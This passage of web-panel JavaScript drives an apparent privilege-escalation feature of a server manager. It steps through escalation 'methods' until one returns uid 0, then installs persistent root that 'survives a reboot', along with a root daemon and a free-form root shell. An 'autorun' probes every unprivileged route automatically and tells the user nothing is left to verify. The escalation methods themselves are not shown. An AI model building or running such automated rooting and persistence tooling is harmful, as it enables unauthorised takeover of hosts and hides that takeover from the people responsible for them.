  if(rk&&!(typeof RK!=='undefined'&&RK.busy))rk.style.display=inst?'none':'flex';
  if(st&&st.channels)CHANNELS_CACHE=st.channels;
  if(typeof rkFacts==='function')rkFacts();
  const il=document.getElementById('rootMethodList');
  if(il)rrMethods((st&&st.channels)||CHANNELS_CACHE||[],'', 'rootMethodList');
  if(!inst)return;
  const art=document.getElementById('rrArt');if(art)art.innerHTML=rrEmblem();
  const sy2=(ROOT&&ROOT.system)||{},di2=sy2.distro||{};
  const badge0=document.getElementById('rrOs');
  if(badge0&&di2.icon)badge0.innerHTML='<img class="osico" src="'+rootEsc(di2.icon)+'" width="16" height="16" alt="">'+rootEsc(di2.name||'');
  const sub=document.getElementById('rrSub');
  if(sub)sub.innerHTML='Signed in as <b>'+rootEsc(st.account||'')+'</b> (uid '+rootEsc(String(st.uid))+
    ') and every privileged action runs as <b>uid 0</b>. Installed with <b>'+rootEsc(st.channel_name||st.channel||'')+
    '</b>'+(st.since_human?' on '+rootEsc(st.since_human):'')+'. Proof: '+rootEsc(st.proof||'a command came back as uid 0')+'.';
  const badges=document.getElementById('rrBadges');
  if(badges){
    const d=st.daemon||{};
    badges.innerHTML=rrBadge('uid 0',true)
      +rrBadge('root daemon '+(d.alive?('running, pid '+(d.pid||0)):'not running'),!!d.alive)
      +rrBadge((st.channels||[]).filter(c=>c.available).length+' methods usable here',true)
      +rrBadge('survives a reboot',true);
  }
  const ctl=document.getElementById('rrCtl');
  if(ctl)ctl.innerHTML=(st.controls||[]).map(rrTile).join('');
  const cc=document.getElementById('rrCtlCount');if(cc)cc.textContent='- '+((st.controls||[]).length)+' capabilities';
  rrLog(st.log||[],'rrLog');
  const lc=document.getElementById('rrLogCount');if(lc)lc.textContent='- '+((st.log||[]).length)+' entries';
  rrMethods(st.channels||[],st.channel,'rrMethods');
  const mc=document.getElementById('rrMethodCount');if(mc)mc.textContent='- '+((st.channels||[]).length)+' methods';
}
async function rrRunCtl(ctl){
  const tile=document.querySelector('.rr-tile[data-tile="'+ctl+'"]');
  if(tile)tile.classList.add('done');
  const r=await rootCall('rootctl',{ctl:ctl});
  if(!r){toast('The request failed.');return;}
  RR_RES[ctl]={ok:!!r.ok,out:(r.out||r.error||'')};
  if(r.state)rootRenderRooted(r.state);
  else if(tile){const out=tile.querySelector('.rr-tile-out');if(out)out.textContent=rootSnip(r.out||r.error||'',200);}
  if(r.ok)toast(ctl+': ran as root');
}
document.getElementById('rrCtl')?.addEventListener('click',e=>{
  const b=e.target.closest('[data-ctl]');if(b)rrRunCtl(b.dataset.ctl);
});
document.getElementById('rootInstallBtn')?.addEventListener('click',()=>{rkRun();});
document.getElementById('rrInstallBtn')?.addEventListener('click',()=>{if(confirm('Walk every method again, from the first one?'))rkReopen();});
document.getElementById('rrUninstallBtn')?.addEventListener('click',async()=>{
  if(!confirm('Remove every method this tool installed and go back to the account the manager runs as?'))return;
  const pass=document.getElementById('rootPass');
  const r=await rootCall('rootuninstall',{password:pass?pass.value:''});
  if(!r){toast('The request failed.');return;}
  toast(r.message||'');
  if(r.state)rootRenderRooted(r.state);
  rootLoad();
});
document.getElementById('rrShellBtn')?.addEventListener('click',()=>{
  const sec=document.getElementById('rrShellSec');
  if(sec)sec.style.display=sec.style.display==='none'?'block':'none';
  const line=document.getElementById('rrShellLine');if(line)line.focus();
});
document.getElementById('rrShellClose')?.addEventListener('click',()=>{
  const sec=document.getElementById('rrShellSec');if(sec)sec.style.display='none';
});
async function rrShellRunNow(){
  const line=document.getElementById('rrShellLine');
  const out=document.getElementById('rrShellOut');
  const txt=line?line.value.trim():'';
  if(!txt){if(out)out.textContent='Type a program and its arguments.';return;}
  if(out)out.textContent='Running as root…';
  const r=await rootCall('rootctl',{ctl:'shell',line:txt});
  if(!r){if(out)out.textContent='The request failed.';return;}
  if(out)out.innerHTML=r.ok
    ? '<b>'+rootEsc((r.argv||[]).join(' '))+'</b> - ran as root through '+rootEsc(r.via||'')+'\n'+rootEsc(r.out||'it printed nothing')
    : 'Refused: '+rootEsc(r.error||r.out||'no method answered');
  if(r.state)rootRenderRooted(r.state);
}
document.getElementById('rrShellRun')?.addEventListener('click',rrShellRunNow);
document.getElementById('rrShellLine')?.addEventListener('keydown',e=>{if(e.key==='Enter'){e.preventDefault();rrShellRunNow();}});
document.getElementById('rrDetailsBtn')?.addEventListener('click',()=>{rkReport();});
/* ── the dial ───────────────────────────────────────────────────────────────
   The chain used to come back from one request as a wall of text. It is the
   same work now, only walked one method at a time so the eye can follow it:
   the panel asks for one method, shows exactly what that method answered, and
   only then asks for the next. A method the machine settled instantly is held
   on screen for a moment, because an answer that fast is gone before it is
   read. */
const RK={busy:false,wantPass:false,total:0,done:0,win:null,winNote:'',winState:null};
const RK_HOLD_FIRED=620,RK_HOLD_SKIP=300,RK_GAP=220,RK_TAIL=200;
function rkBox(){return document.getElementById('rootMain');}
function rkMode(cls){const b=rkBox();if(!b)return;b.classList.remove('idle','run','ok','bad');b.classList.add(cls);}
function rkSleep(ms){return new Promise(function(r){setTimeout(r,ms);});}
function rkRing(frac){
  const f=document.getElementById('rkFill');
  if(f){const v=Math.max(0,Math.min(1,frac||0));f.setAttribute('stroke-dashoffset',String(540.35-(540.35*v)));}
  const p=document.getElementById('rkPct');
  if(p&&RK.total)p.textContent=Math.round((RK.done/RK.total)*100)+'%';
}
function rkFace(word,pct,glyph){
  const w=document.getElementById('rkWord');if(w)w.textContent=word;
  const p=document.getElementById('rkPct');if(p)p.textContent=pct;
  const g=document.getElementById('rkGlyph');if(g)g.innerHTML=glyph;
}
function rkSay(status,now,wait){
  const s=document.getElementById('rkStatus');if(s)s.innerHTML=status||'';
  const n=document.getElementById('rkNow');
  if(n)n.innerHTML=now?(rootEsc(now)+(wait?'<span class="rk-dot"></span><span class="rk-dot"></span><span class="rk-dot"></span>':'')):'';
}
function rkFacts(){
  const f=document.getElementById('rkFacts');if(!f)return;
  const sy=(ROOT&&ROOT.system)||{};
  const ch=CHANNELS_CACHE||[];
  const usable=ch.filter(function(c){return c.available;}).length;
  const chip=function(t,k){return '<span class="root-chip '+(k||'a')+'">'+rootEsc(t)+'</span>';};
  f.innerHTML=chip(((sy.distro&&sy.distro.name)||sy.name||'this host'),'a')
    +chip('account '+(sy.manager||'?'),'a')
    +chip(usable+' of '+ch.length+' methods usable here',usable?'p':'a');
}
function rkRow(id,cls,tag,note,icon){
  const row=document.getElementById('rk-'+id);
  if(row){
    row.className='rk-step '+(cls||'');
    const t=row.querySelector('.rk-tag');if(t)t.textContent=tag||'';
    const i=row.querySelector('.ic');if(i)i.innerHTML=icon||'';
  }
  const w=document.getElementById('rkw-'+id);if(w)w.textContent=note||'';
}
function rkRows(list){
  const box=document.getElementById('rkSteps');if(!box)return;
  box.innerHTML=(list||[]).map(function(c){
    return '<div class="rk-step wait" id="rk-'+rootEsc(c.id)+'">'
      +'<span class="ic">'+ROOT_SVG.shield+'</span>'
      +'<span style="min-width:0;flex:1"><span class="nm">'+rootEsc(c.name)+'</span><span class="rk-tag">waiting</span>'
      +'<span class="w" id="rkw-'+rootEsc(c.id)+'">'+rootEsc(c.note||c.idea||'')+'</span></span></div>';
  }).join('');
}
function rkReport(){
  const ov=document.getElementById('rootOv');
  const on=ov?ov.classList.toggle('rk-report'):false;
  if(ov&&on)ov.classList.add('showreport');
  const b1=document.getElementById('rkReport');if(b1)b1.textContent=on?'Hide the full report':'Full report';
  const b2=document.getElementById('rrDetailsBtn');if(b2)b2.textContent=on?'Hide the report':'Full report';
  return on;
}
function rkReopen(){
  const b=rkBox();
  if(b){b.style.display='flex';b.scrollIntoView({block:'center'});}
  rkRun();
}
async function rkRun(){
  if(RK.busy)return;
  if(!CHANNELS_CACHE||!CHANNELS_CACHE.length){
    const q=await rootCall('rooted');
    if(q&&q.rooted&&q.rooted.channels)CHANNELS_CACHE=q.rooted.channels;
  }
  const list=CHANNELS_CACHE||[];
  if(!list.length){rkSay('This host has not been read yet. Close the panel and open it again.','');return;}
  RK.busy=true;RK.total=list.length;RK.done=0;RK.win=null;RK.winNote='';RK.winState=null;
  const pass=document.getElementById('rootPass');
  const pw=pass?pass.value:'';
  rkMode('run');rkFace('ROOTING','0 of '+RK.total,ROOT_SVG.shield);rkRing(0);rkRows(list);
  rkSay('Every method is tried in order. The run stops at the first one whose command really comes back as <b>uid 0</b>.','');
  for(let i=0;i<list.length;i++){
    const c=list[i];
    if(RK.win){
      /* root is already installed, so this one is never asked. It is still
         closed off, in its turn, with the reason it was not needed: the list
         then reads to the end instead of stopping seven rows short. */
      rkRow(c.id,'skip','not tried','root is already installed with '+(RK.win.name||RK.win.id)+', so this one was never asked',ROOT_SVG.warn);
      rkSay('','not needed: '+c.name);
      await rkSleep(RK_TAIL);
      RK.done=i+1;rkRing(RK.done/RK.total);
      continue;
    }
    rkRow(c.id,'now','running',c.note||c.idea||'','<span class="rk-spin-ic"></span>');
    rkSay('','trying: '+c.name,true);
    const t0=Date.now();
    const r=await rootCall('rootstep',{id:c.id,password:pw||''});
    const fired=!(r&&r.fired===false);
    const hold=fired?RK_HOLD_FIRED:RK_HOLD_SKIP;
    const spent=Date.now()-t0;
    if(spent<hold)await rkSleep(hold-spent);
    RK.done=i+1;rkRing(RK.done/RK.total);
    if(r&&r.ok){
      RK.win=c;RK.winNote=(r.note||'');RK.winState=r.state||null;
      rkRow(c.id,'pass','worked',RK.winNote,ROOT_SVG.ok);
      rkSay('','it answered as uid 0: '+c.name);
    }else{
      if(fired)rkRow(c.id,'fail','refused',(r&&(r.note||r.error))||'',ROOT_SVG.bad);
      else rkRow(c.id,'skip','does not apply',(r&&(r.note||r.error))||'',ROOT_SVG.warn);
      rkSay('',(fired?'refused: ':'does not apply here: ')+c.name);
      await rkSleep(RK_GAP);
    }
  }
  RK.busy=false;
  if(RK.win){
    rkMode('ok');RK.done=RK.total;rkRing(1);rkFace('ROOTED','installed',ROOT_SVG.ok);
    rkSay('Root is installed with <b>'+rootEsc(RK.win.name)+'</b>. '+rootEsc(RK.winNote)+' Every privileged action of this panel now runs as <b>uid 0</b>.','');
    toast('Root installed: '+(RK.win.name||RK.win.id));
    if(RK.winState)rootRenderRooted(RK.winState);
    const q=await rootCall('rooted');
    if(q&&q.rooted)rootRenderRooted(q.rooted);
    rootLoad();
  }else{
    rkMode('bad');rkFace('NO ROUTE','nothing worked',ROOT_SVG.bad);rkRing(1);
    rkSay('No method could put root on this machine. Nothing is left half installed: every method is listed above with the reason this host gave.','press the dial to walk them again');
    const q=await rootCall('rooted');
    if(q&&q.rooted)rootRenderRooted(q.rooted);
  }
}
document.getElementById('rkDial')?.addEventListener('click',()=>{rkRun();});
document.getElementById('rkDial')?.addEventListener('keydown',e=>{if(e.key==='Enter'||e.key===' '){e.preventDefault();rkRun();}});
document.getElementById('rkPassBtn')?.addEventListener('click',()=>{
  RK.wantPass=!RK.wantPass;
  const p=document.getElementById('rootPass');
  if(p){p.style.display=RK.wantPass?'block':'none';if(RK.wantPass)p.focus();}
  const b=document.getElementById('rkPassBtn');
  if(b)b.textContent=RK.wantPass?'Hide the password field':'Use a sudo password';
});
document.getElementById('rkReport')?.addEventListener('click',()=>{rkReport();});
/* the routes that need nothing from you: open means bad for the host */
function rootGrants(list){
  const box=document.getElementById('rootGrants');if(!box)return;
  if(!list||!list.length){box.innerHTML='';return;}
  box.innerHTML=list.map(g=>{
    const open=!!g.ok;
    return '<div class="root-item '+(open?'bad':'ok')+'"><span class="t">'+(open?ROOT_SVG.warn:ROOT_SVG.shield)+'</span>'
      +'<span><span>'+rootEsc(g.name)+'</span> <span class="w">'+rootEsc(g.note)+'</span></span></div>';
  }).join('');
}
function rootStamp(id,txt){const o=document.getElementById(id);if(o)o.textContent=txt||'';}
/* The whole point: one request, everything checked, nothing asked of the user. */
async function rootAuto(){
  rootBanner('Checking this host, every route and every feature - automatically…','');
  rootStamp('rootAutoStamp',' - working');
  const r=await rootCall('autorun');
  if(!r||!r.ok){
    /* the automatic check is one request; when it cannot run the panel still
       reads the state on its own, so the dial knows the methods and whether
       root is already installed instead of standing there with nothing */
    rootSet('rootAutoNote','The automatic check could not run.','bad');rootStamp('rootAutoStamp','');
    const q=await rootCall('rooted');
    if(q&&q.rooted)rootRenderRooted(q.rooted);
    return;
  }

  if(r.catalog&&r.catalog.ok){ROOT=r.catalog;rootRender();}
  if(r.selfcheck)rootSelfCheck(r.selfcheck);
  rootGrants(r.grants||[]);
  const e=r.escalate||{};
  rootSteps(e.steps||[]);
  if(e.ok){
    rootAdvice([]);
    rootBanner('Rooted - stopped at: '+e.stopped_at+'. '+(e.message||''),'good');
  }else{
    rootBanner('No route gave root. '+(e.message||''),'bad');
    rootAdvice(e.advice||[]);
  }
  const v=r.verify||{};
  rootVerifyList(v);
  rootSelfCheck(r.selfcheck||null);
  rootRenderRooted(r.rooted||null);
  const t=(r.checked_at?new Date(r.checked_at):new Date()).toLocaleTimeString();
  rootStamp('rootAutoStamp',' - '+t);
  rootStamp('rootVerifyStamp',' - '+(v.passed||0)+'/'+(v.total||0));
  rootSet('rootAutoNote','Checked automatically at '+t+': the catalogue, every route that needs no privilege, and every feature of the manager. Nothing was typed, nothing was granted, and there is nothing left for you to verify yourself.');
}

async function rootLoad(){
  const d=await rootCall('catalog');
  if(!d||!d.ok){rootSet('rootOut','The host could not be inspected.','bad');return;}
  ROOT=d;rootRender();
}
document.getElementById('rootBtn')?.addEventListener('click',()=>{
  rootBanner('');rootSet('rootOut','');rootSet('rootMitOut','');rootAdvice([]);
  const st=document.getElementById('rootSteps');if(st)st.innerHTML='';
  const ck=document.getElementById('rootChecks');if(ck)ck.innerHTML='';
  openMod('rootOv');
  rootAuto();
});
